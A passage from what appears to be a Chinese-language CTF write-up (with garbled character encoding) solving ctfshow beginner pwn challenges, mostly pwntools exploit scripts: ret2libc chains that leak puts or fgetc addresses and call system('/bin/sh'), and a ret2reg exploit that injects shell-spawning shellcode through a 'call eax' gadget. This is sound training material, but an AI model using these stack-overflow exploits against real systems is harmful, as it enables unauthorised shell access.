</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>python3-exp2ï¼ˆæ³„éœ²putså‡½æ•°ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28177</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004008e3</span> <span class="c1">#0x00000000004008e3 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000400576</span> <span class="c1">#0x0000000000400576 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;puts_address = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>python2â€”exp3ï¼ˆå®˜æ–¹WPç‰ˆï¼Œç”¨ctfshowé…çš„çš„Ubuntu18.04çš„Libcï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28177</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4008e3</span> <span class="c1"># 0x00000000004008e3 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400576</span> <span class="c1"># 0x0000000000400576 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">fgetc_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;fgetc&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x110</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgetc_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fgetc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">fgetc</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">fgetc</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;fgetc&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;libc_base = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x110</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‰ç§æ–¹æ³•å„å–æ‰€å¥½ï¼Œéƒ½æ¯”è¾ƒç®€å•ï¼Œé€»è¾‘æ¸…æ™°ã€‚</p>
<h3 id="ret2regæ”»å‡»"><strong>ret2regæ”»å‡»</strong>
</h3><p><code>ret2reg</code>ï¼ˆReturn to Registerï¼‰æ˜¯ <strong>æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨ä¸­çš„ä¸€ç§åŸºç¡€ ROP æ‰‹æ³•</strong>ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>åˆ©ç”¨ç¨‹åºè‡ªèº«çš„æŒ‡ä»¤åºåˆ—ï¼Œå°†æ ˆä¸Šçš„å¯æ§æ•°æ® â€œæ¬è¿â€ åˆ°å¯„å­˜å™¨ä¸­</strong>ï¼Œå†é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ã€è·³è½¬æ‰§è¡Œç›®æ ‡ä»£ç ï¼ˆå¦‚<code>system</code>ã€<code>execve</code>ï¼‰â€”â€” æœ¬è´¨æ˜¯ â€œç”¨å¯„å­˜å™¨åšä¸­é—´æ¡¥æ¢ï¼Œè§£å†³æ ˆæ•°æ®æ— æ³•ç›´æ¥ä½œä¸ºå‡½æ•°å‚æ•° / è·³è½¬ç›®æ ‡çš„é—®é¢˜â€ã€‚</p>
<p>å®ƒä¸åƒ<code>ret2libc</code>ï¼ˆè·³ libc å‡½æ•°ï¼‰ã€<code>ret2syscall</code>ï¼ˆç›´æ¥è°ƒç³»ç»Ÿè°ƒç”¨ï¼‰é‚£æ ·æœ‰æ˜ç¡®çš„ â€œå›ºå®šæµç¨‹â€ï¼Œè€Œæ˜¯ä¸€ç§ <strong>çµæ´»çš„ â€œæ•°æ®æ¬è¿æŠ€å·§â€</strong>ï¼Œå¸¸ä½œä¸ºå¤æ‚ ROP é“¾çš„ â€œå‰ç½®æ­¥éª¤â€ï¼ˆæ¯”å¦‚æ ˆä¸Šæœ‰<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œä½†å‡½æ•°éœ€è¦<code>rdi</code>å¯„å­˜å™¨ä¼ å‚ï¼Œå°±ç”¨<code>ret2reg</code>æŠŠæ ˆä¸­å­—ç¬¦ä¸²åœ°å€æ¬åˆ°<code>rdi</code>ï¼‰ã€‚</p>
<p>æ ˆæº¢å‡ºåï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶æ ˆä¸Šçš„æ•°æ®ï¼Œä½† x86-64/32 ä½ç¨‹åºçš„å‡½æ•°è°ƒç”¨ã€ç³»ç»Ÿè°ƒç”¨æœ‰æ˜ç¡®çš„ â€œå‚æ•°ä¼ é€’è§„åˆ™â€ï¼š</p>
<ul>
<li>64 ä½ç¨‹åºï¼šå‡½æ•°å‚æ•°ä¼˜å…ˆå­˜åœ¨<code>rdi</code>ã€<code>rsi</code>ã€<code>rdx</code>ç­‰å¯„å­˜å™¨ï¼ˆè€Œéæ ˆï¼‰ï¼›</li>
<li>32 ä½ç¨‹åºï¼šå‡½æ•°å‚æ•°å­˜åœ¨æ ˆä¸Šï¼Œä½†æœ‰æ—¶éœ€è¦å¯„å­˜å™¨ä½œä¸ºä¸´æ—¶å­˜å‚¨ï¼ˆå¦‚è·³è½¬åœ°å€ã€æ•°æ®æŒ‡é’ˆï¼‰ã€‚</li>
</ul>
<h3 id="pwn_079">PWN_079
</h3><p>é¢˜ç›®ï¼šä½ éœ€è¦æ³¨æ„æŸäº›å‡½æ•°ï¼Œè¿™æ˜¯è§£é¢˜çš„å…³é”®ï¼</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/429.png"
	width="805"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/429_hu_bc260940524eddbb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/429_hu_2548263ee27e1825.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>32ä½ç¨‹åºï¼Œä»…éƒ¨åˆ†å¼€å¯RELRO.</p>
<p>IDA32åˆ†æ:</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/431.png"
	width="780"
	height="265"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/431_hu_2ec8b6ca8adc7bd2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/431_hu_2b34f72138ae1d36.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="706px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/432.png"
	width="750"
	height="139"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/432_hu_c53f2efa6916d39.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/432_hu_dfeff7c6ab13f7d7.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="539"
		data-flex-basis="1294px"
	
></p>
<p>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆ° input æ•°ç»„ï¼Œæœ€å¤šè¯»å– 2048 å­—èŠ‚ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼ é€’ç»™ctfshow å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œctfshowå‡½æ•°å†…æœ‰strcpyå‡½æ•°ï¼Œä½œç”¨æ˜¯å°†inputå­—ç¬¦ä¸²å¤åˆ¶ç»™bufæ•°ç»„ä¸­ï¼Œä½†æ˜¯strcpyä¸ä¼šæ£€æŸ¥é•¿åº¦ï¼Œè¿™é‡Œå°±æœ‰æ ˆæº¢å‡ºæ¼æ´äº†ã€‚</p>
<p>è¿™é“é¢˜çš„æ–¹æ³•å¾ˆå¤šçš„ï¼Œæˆ‘è¿™é‡Œç”¨<code>ret2reg</code>ï¼Œå…ˆç”¨gdbè°ƒè¯•çœ‹çœ‹å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘æ ˆæº¢å‡ºçš„ç¼“å†²åŒºç©ºé—´çš„ï¼Œå¯ä»¥è¾“å…¥ä¸€äº›å­—ç¬¦ä¸²è¿›å»çœ‹çœ‹ï¼Œ</p>
<p>ä¸€æ­¥æ­¥å°è¯•ï¼Œå…ˆæ‰“å¼€gdbç•Œé¢ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/433.png"
	width="1913"
	height="873"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/433_hu_1d14f66651156a41.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/433_hu_d1278449f1393f2e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>næ­¥è¿›åˆ°è¾“å…¥ç•Œé¢ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/434.png"
	width="1913"
	height="873"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/434_hu_8ababd6569f1faf2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/434_hu_fa04dc949493ec9b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>è¾“å…¥ä¸€äº›å¯è¾¨è¯†çš„å­—ç¬¦ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/435.png"
	width="1913"
	height="846"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/435_hu_64d19ec35a9bc94f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/435_hu_b09739dc2ecd22ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="542px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°â€œAAAAâ€å­—ç¬¦è¾“å…¥è¿›æ ˆé‡Œï¼ŒESPã€EAXã€ECXå¯„å­˜å™¨æŒ‡å‘å®ƒã€‚</p>
<p>å¯ä»¥é€‰æ‹©ECXæˆ–è€…EAXï¼Œå»ºè®®ä¸è¦é€‰æ‹©ESPï¼Œæ¯•ç«ŸESPæ˜¯éšæ—¶åŠ¨æ€å˜åŒ–çš„æŒ‡é’ˆã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ­¤æ—¶å¯„å­˜å™¨æŒ‡å‘è¿™é‡Œï¼Œåœ¨æˆ‘ä»¬æ ˆæº¢å‡ºå¡«å……ç¼“å†²åŒºæ—¶ï¼Œå¯ä»¥æŠŠè¿™AAAAä¸€å¹¶å¡«å……è¿›å»ï¼Œå½“è¦†ç›–åˆ°ebp+4â€”è¿”å›åœ°å€æ—¶ï¼Œè¦†å†™ä¸€ä¸ªgadgetï¼Œä¸€ä¸ªè°ƒç”¨è¿™ä¸ªå¯„å­˜å™¨çš„gadgetï¼ŒåŠ ä¸Šä¹‹å‰è¿™ä¸ªå¯„å­˜å™¨æŒ‡å‘è¿™ä¸ªæ ˆï¼Œè°ƒç”¨æ ˆé‡Œçš„ä¸œè¥¿ä¹Ÿå°±æ˜¯AAAA+ä¸€äº›åƒåœ¾å€¼ï¼Œé‚£å¦‚æœæŠŠAAAAæ›¿æ¢æˆshellcodeçš„è¯å²‚ä¸æ˜¯ç›¸å½“äºè°ƒç”¨shellcodeï¼Ÿ</p>
<p>é‚£è¿™æˆ‘ä»¬å¯ä»¥è¯•è¯•ï¼Œå…ˆROPgadgetæŸ¥è¯¢ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s2">&#34;call|jmp&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/436.png"
	width="1696"
	height="726"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/436_hu_7cbe476023f7dbd8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/436_hu_bb5d4d59b832d3cd.png 1024w"
	loading="lazy"
	
		alt="call_eax=0x080484a0"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="560px"
	
></p>
<p>åªæ‰¾åˆ°äº†<code>0x080484a0 : call eax</code>ï¼Œé‚£å°±ç”¨è¿™ä¸ªã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28275</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">call_eax</span> <span class="o">=</span> <span class="mh">0x080484a0</span> <span class="c1">#0x080484a0 : call eax</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">((</span><span class="mh">0x208</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">-</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">call_eax</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„(0x208+4)æ˜¯ç¼“å†²åŒºé•¿åº¦åŠ æ—§çš„ebpæœ¬èº«4å­—èŠ‚é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯0x20Cï¼Œè¿™ä¸ªé•¿åº¦åˆšå¥½è¦†ç›–åˆ°ebp+4è¿™ï¼Œåˆšå¥½åˆ°è¿”å›åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œè¿™æ—¶å†ä¸Šä¼ <code>p32(call_eax)</code>ï¼Œè¿”å›åœ°å€å˜æˆè°ƒç”¨eaxçš„åœ°å€ï¼ŒeaxåˆæŒ‡å‘æ ˆï¼Œè€Œæ ˆé‡Œåˆå­˜äº†shellcodeï¼Œè¿™å°±getshelläº†ã€‚</p>
<p>ä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒç»•ã€‚</p>
<h3 id="pwn_080å¾…å®š">PWN_080ï¼ˆå¾…å®šï¼‰
</h3><p>é¢˜ç›®ï¼šç›²æ‰“ blind rop ï¼ˆä¸æ˜¯å¿˜è®°æ”¾é™„ä»¶ï¼Œæ˜¯æœ¬èº«å°±æ²¡é™„ä»¶ï¼ï¼ï¼ï¼‰</p>
<h3 id="pwn_081">PWN_081
</h3><p>é¢˜ç›®ï¼šROPå˜ç§ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/437.png"
	width="775"
	height="206"
